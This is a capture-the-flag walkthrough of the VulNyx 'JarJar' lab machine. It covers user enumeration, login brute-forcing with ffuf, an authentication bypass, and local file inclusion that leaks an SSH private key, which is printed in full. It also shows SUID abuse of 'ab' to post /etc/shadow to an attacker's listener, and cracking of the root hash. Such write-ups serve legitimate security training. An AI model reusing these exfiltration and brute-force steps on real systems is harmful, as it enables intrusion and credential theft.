# CTF Penetration Testing

## Platform: VulNyx

### Machine: [JarJar](https://vulnyx.com/#jarjar)

- Machine type: <img src="https://hackmyvm.eu/img/linux.png" alt="Linux" width="17"/> Linux
- Machine difficulty: 🟨 Medium

#### Skills Learned

- **User Enumeration**
- **Authentication Bypass** - Via Direct Access
- **Local File Inclusion (LFI)**
- **Linux Privilege Escalation** - Special Permissions

#### Machine Writeup

```
┌──(nabla㉿kali)-[~]
└─$ ifconfig eth0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.247.128  netmask 255.255.255.0  broadcast 192.168.247.255

[SNIP]
```

```
┌──(nabla㉿kali)-[~]
└─$ fping 192.168.247.133

192.168.247.133 is alive

┌──(nabla㉿kali)-[~]
└─$ sudo nmap -Pn -sS -p- 192.168.247.133 -T5 

[SNIP]

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```
┌──(nabla㉿kali)-[~]
└─$ whatweb http://192.168.247.133

http://192.168.247.133 [200 OK] Adobe-Flash, Apache[2.4.61], Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Debian Linux][Apache/2.4.61 (Debian)], IP[192.168.247.133], Object, Title[The Menace of Jar Jar], YouTube
```

![Firefox - Homepage (http://192.168.247.133)](./assets/screenshots/vulnyx_jarjar_firefox_homepage_1.png)

```
┌──(nabla㉿kali)-[~]
└─$ echo -e '192.168.247.133\tjarjar.nyx' | sudo tee -a /etc/hosts

192.168.247.133 jarjar.nyx

┌──(nabla㉿kali)-[~]
└─$ whatweb http://jarjar.nyx

http://jarjar.nyx [200 OK] Apache[2.4.61], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.61 (Debian)], IP[192.168.247.133], JQuery[1.10.2], Script[text/javascript], X-UA-Compatible[IE=edge]
```

![Firefox - Homepage (http://jarjar.nyx)](./assets/screenshots/vulnyx_jarjar_firefox_homepage_2.png)

![Firefox - Login Page](./assets/screenshots/vulnyx_jarjar_firefox_login_page.png)

**User Enumeration**

![Firefox - User Enumeration 1](./assets/screenshots/vulnyx_jarjar_firefox_user_enumeration_1.png)

![Firefox - User Enumeration 2](./assets/screenshots/vulnyx_jarjar_firefox_user_enumeration_2.png)

```
┌──(nabla㉿kali)-[~]
└─$ echo -e 'Jar Jar\nYoda\nObi Wan\nDarth Vader\nQuigon' | tee ./usernames.txt

Jar Jar
Yoda
Obi Wan
Darth Vader
Quigon

┌──(nabla㉿kali)-[~/tools/username-anarchy]
└─$ username-anarchy -i ./usernames.txt -f firstlast,flast,lfirst,first,last | tee ./usernames_anarchy.txt

jar
jarjar
jjar
jar-jar
yoda
obi
obiwan
owan
wobi
wan
darth
darthvader
dvader
vdarth
vader
quigon

┌──(nabla㉿kali)-[~]
└─$ ffuf -w ./usernames_anarchy.txt:FUZZ1 -u http://jarjar.nyx/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ1&password=Test123" -fr "Invalid Username or Password" -t 100

[SNIP]

quigon                  [Status: 200, Size: 4185, Words: 1674, Lines: 134, Duration: 13ms]
jarjar                  [Status: 200, Size: 4185, Words: 1674, Lines: 134, Duration: 16ms]
obiwan                  [Status: 200, Size: 4185, Words: 1674, Lines: 134, Duration: 18ms]

┌──(nabla㉿kali)-[~]
└─$ echo -e 'quigon\njarjar\nobiwan' | tee ./users.txt

quigon
jarjar
obiwan
```

![Firefox - Login Attempt 1](./assets/screenshots/vulnyx_jarjar_firefox_login_attempt_1.png)

![Firefox - Login Attempt 2](./assets/screenshots/vulnyx_jarjar_firefox_login_attempt_2.png)

```
┌──(nabla㉿kali)-[~]
└─$ ffuf -w ./users.txt:FUZZ1 -w /usr/share/wordlists/rockyou.txt:FUZZ2 -u http://jarjar.nyx/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ1&password=FUZZ2" -fr "Invalid Password" -t 100

❌
```

```
┌──(nabla㉿kali)-[~]
└─$ dirsearch -u http://jarjar.nyx

[SNIP]

[04:51:01] 200 -    2KB - /about.php                                        
[04:51:02] 302 -   13KB - /admin.php  ->  login.php                         
[04:51:08] 200 -    2KB - /contact.php
[04:51:13] 200 -    1KB - /login.php
```

**Authentication Bypass**

![Burp Suite - Authentication Bypass 1](./assets/screenshots/vulnyx_jarjar_burpsuite_authentication_bypass_1.png)

![Burp Suite - Authentication Bypass 2](./assets/screenshots/vulnyx_jarjar_burpsuite_authentication_bypass_2.png)

![Firefox - Authentication Bypass](./assets/screenshots/vulnyx_jarjar_firefox_authentication_bypass.png)

![Firefox - Admin Panel Logs](./assets/screenshots/vulnyx_jarjar_firefox_admin_panel_logs.png)

**Local File Inclusion (LFI)**

![Firefox - LFI Attempt](./assets/screenshots/vulnyx_jarjar_firefox_lfi_attempt.png)

![Firefox - LFI Attempt 1](./assets/screenshots/vulnyx_jarjar_firefox_lfi_attempt_1.png)

![Firefox - LFI Attempt 2](./assets/screenshots/vulnyx_jarjar_firefox_lfi_attempt_2.png)

![Firefox - LFI Attempt 3](./assets/screenshots/vulnyx_jarjar_firefox_lfi_attempt_3.png)

![Burp Suite - LFI `/etc/passwd`](./assets/screenshots/vulnyx_jarjar_burpsuite_lfi_passwd.png)

![Burp Suite - LFI `/home/jarjar/.ssh/id_rsa`](./assets/screenshots/vulnyx_jarjar_burpsuite_lfi_id_rsa.png)

```
┌──(nabla㉿kali)-[~]
└─$ vim ./id_rsa  

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAobM9uwDsl3E5r5YbeMwrggg/OPDoOooCwbKw5jKCLZybLMzR0bxl
cu6K4PJKWcdEnopJbH7C3BgntD2mYXiml2KcTWCDKDKZ/9nO195ehrU4xqsU/jGt/j/u5U
mwA4/UTWWXNWTuBytFRtJ8zGB37juHOMn6xbgbSncm3Rak2PxP4bv9HtUpGQKNLmVH7pnu
jMXYC3rdA+wCoPL5X87TuzUHnZYGSq0udylGT2IKNbwhurcFTeQ0ocjTFC5rVcs7pWzK+D
HhHRxTa+lE+zyYz8V8V1H7bUGKcK+okk21aOHh2DYWo/8GJ2xPZPVNi3VCvNxs5kZ02iJM
tfoCAVrfbzNHTmntHxldv0yoFBL+EU5UqSffT1k1+WdVBua+wLjELiy9NXHcNWCZxyxXSW
o9OstouG5nD/5UEDSYr9MkQ6H93y8Ifh567dcaYZC8hMHe40eTdp6WYblWD2z+Yw+khZwW
yK8zTTv6S5a3OsZsR/2AxhcTCDnUhbJ9ypJZvc25AAAFiEf03BNH9NwTAAAAB3NzaC1yc2
EAAAGBAKGzPbsA7JdxOa+WG3jMK4IIPzjw6DqKAsGysOYygi2cmyzM0dG8ZXLuiuDySlnH
RJ6KSWx+wtwYJ7Q9pmF4ppdinE1ggygymf/ZztfeXoa1OMarFP4xrf4/7uVJsAOP1E1llz
Vk7gcrRUbSfMxgd+47hzjJ+sW4G0p3Jt0WpNj8T+G7/R7VKRkCjS5lR+6Z7ozF2At63QPs
AqDy+V/O07s1B52WBkqtLncpRk9iCjW8Ibq3BU3kNKHI0xQua1XLO6Vsyvgx4R0cU2vpRP
s8mM/FfFdR+21BinCvqJJNtWjh4dg2FqP/BidsT2T1TYt1QrzcbOZGdNoiTLX6AgFa328z
R05p7R8ZXb9MqBQS/hFOVKkn309ZNflnVQbmvsC4xC4svTVx3DVgmccsV0lqPTrLaLhuZw
/+VBA0mK/TJEOh/d8vCH4eeu3XGmGQvITB3uNHk3aelmG5Vg9s/mMPpIWcFsivM007+kuW
tzrGbEf9gMYXEwg51IWyfcqSWb3NuQAAAAMBAAEAAAGABJf+J8sMbaGlVQ7WI/Xk7IebHY
fWiRyKRyzHksVE5n0oTrsDi5+nCtSqXwlIbHQunQm/sT8z/k20tGL7UDyTEFeYVNMU7CDt
OBQHfiF5R6lr/f+L6UwfAyCXgwMMvDqApQbpp0uBPvSPPhuqY6H/9jrRtMl5gCwioQMb4w
m1etvxfFpmA/4OnKvHuAA07XCJEuMR/VgrDDqkY88on3yq44rLocH1LCJEYNVBg+18mG80
+W7L+J0EPm5hShWm2KPyjR6TUXADqNIKeExNpergWdom00xQEADc/i7bGNFyyWKeS8DFg0
NBz3omlaccv+E/n7VdJdGcsvVS+/6sY4T1fj1Mg39fVOPpiItY2Zr074VcrQC9nNyMxFJ/
rzPkJQ7Fs1uF9MsYfVbGgoj14mlXPya5kF82REWZ0rymZj6yaZJOAwAktcuOhKcxpAAr+W
Bk4czmgLhhYShkxyl+Nhyb7geIzoBnAyK2JeAYa59+eNxHUAa9cZqFIMQLw97DiBFBAAAA
wBJTCCdgaqOzDxZTG/yeD7HHehZUszvAPydDl3W6rvFEj8HZPwyj2D5qsIzVD2OlU/eNmX
0MeX9TWk17+WmSOP/N6Csr6Q6/xnF9fvL2ZFsu6Iu/0lH99UPinnbzo9+5IDAUcMg7W4oc
4GHgF6FR7ysYqj0Nu4coUmfRv/EUAULpCwqbXi0XR3f2hbOUFYQ8jKoS3sDgpGCnk62pfG
sAbwzfTP5sjouVR8dVw4EFtTpAMbbatgnc70WJh4gUgtfwswAAAMEAzLtgI78zErVssHED
VCrfARGjG498x91S+ajFRVQFvQcPVJX8DfCGifaOcH3ieFafDeRCrn/kmUaa3MIU3Y2yeb
bhjnbip52JUD6KV3f+BoW9ltECLdRKphpZQHJ0r69yceaDuB538XRiJ63MWMZTUrtAGYDP
x94idiHg9N3Lw1ztm2S6Q218BDpJnnU/dwTZvqgZkc2qSuTbaOBGjCPdBfHcSQ9l/OCyR5
Eqj9Zv5giu4ehBldmuqWt0ygCSQQgRAAAAwQDKMUEHRt+EYbpjXTjv2T7f+y+irnwgq19y
pdIuWkmlqE/6BozAWKVrANNKz8ZURYFWa/tOPm/olKlZNU6TvxpqRiRrhI+k5MCAoCeNMe
ZJfOpv/M8dau/tIByzj4j6tElaY+GVkHK2MZVU572OpDCa3IVrU/xSneaG329ORnLLkP9P
erALlZFGMFty5w8d3eSBlEYtejcoh6BFk2GdA0kv2g4JHgYqGeJwG7EkxfGnokA89D9r6w
knE2xJtwJWUykAAAANamFyamFyQGphcmphcgECAwQFBg==
-----END OPENSSH PRIVATE KEY-----

┌──(nabla㉿kali)-[~]
└─$ chmod 600 ./id_rsa 

┌──(nabla㉿kali)-[~]
└─$ ssh jarjar@'jarjar.nyx' -i ./id_rsa

Linux jarjar 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64

Last login: Tue Jul 23 02:56:55 2024 from 192.168.1.47
jarjar@jarjar:~$ 
```

```
jarjar@jarjar:~$ ls -la

total 28
drwxr-xr-x 3 jarjar jarjar 4096 Jul 22  2024 .
drwxr-xr-x 5 root   root   4096 Jul 21  2024 ..
lrwxrwxrwx 1 jarjar jarjar    9 Jul 21  2024 .bash_history -> /dev/null
-rw-r--r-- 1 jarjar jarjar  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 jarjar jarjar 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 jarjar jarjar  807 Apr 23  2023 .profile
drwx------ 2 jarjar jarjar 4096 Jul 22  2024 .ssh
-r-------- 1 jarjar jarjar   33 Jul 21  2024 user.txt

jarjar@jarjar:~$ cat user.txt 

cd3af*************************** 🚩
```

**Linux Privilege Escalation**

```
jarjar@jarjar:~$ find / -perm -4000 2> /dev/null

/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/bin/ab
/usr/bin/mount
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/fusermount3
/usr/bin/chsh
```

```
┌──(nabla㉿kali)-[~]
└─$ nc -lvnp 1337         
listening on [any] 1337 ...

[CONTINUE]
```

![Firefox - GTFOBins `/usr/bin/ab` File Upload](./assets/screenshots/vulnyx_jarjar_firefox_gtfobins_suid_file_upload.png)

```
jarjar@jarjar:~$ ab -p /etc/shadow http://192.168.247.128:1337/shadow

This is ApacheBench, Version 2.3 <$Revision: 1913912 $>
Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/
Licensed to The Apache Software Foundation, http://www.apache.org/

Benchmarking 192.168.247.128 (be patient).....done
```

```
[CONTINUE]

connect to [192.168.247.128] from (UNKNOWN) [192.168.247.224] 51278
POST /shadow HTTP/1.0
Content-length: 941
Content-type: text/plain
Host: 192.168.247.128:1337
User-Agent: ApacheBench/2.3
Accept: */*

root:$y$j9T$06k8CpwIHWwvgOizpHNH30$VTfTBXChehaq8kPRI5Lhh54LIRXdbkoP3ZxOGQaxqZ0:19926:0:99999:7:::
```

```
┌──(nabla㉿kali)-[~]
└─$ echo -n 'root:$y$j9T$06k8CpwIHWwvgOizpHNH30$VTfTBXChehaq8kPRI5Lhh54LIRXdbkoP3ZxOGQaxqZ0' > hash.txt

┌──(nabla㉿kali)-[~]
└─$ john ./hash.txt --wordlist=/usr/share/wordlists/rockyou.txt                                             
No password hashes loaded (see FAQ)
❌

┌──(nabla㉿kali)-[~]
└─$ john ./hash.txt --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt

[SNIP]

pimpin           (root)  
```

```
jarjar@jarjar:~$ su

Password: 
root@jarjar:/home/jarjar# 
```

```
root@jarjar:/home/jarjar# ls -la /root

total 32
drwx------  4 root root 4096 Jul 22  2024 .
drwxr-xr-x 18 root root 4096 Feb 12  2024 ..
lrwxrwxrwx  1 root root    9 Jul 21  2024 .bash_history -> /dev/null
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
-rw-------  1 root root   20 Feb 12  2024 .lesshst
drwxr-xr-x  3 root root 4096 Feb 12  2024 .local
lrwxrwxrwx  1 root root    9 Jul 22  2024 .mysql_history -> /dev/null
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-r--------  1 root root   33 Jul 21  2024 r00t.txt
drwx------  2 root root 4096 Feb 12  2024 .ssh

root@jarjar:/home/jarjar# cat /root/r00t.txt

322f0*************************** 🚩
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
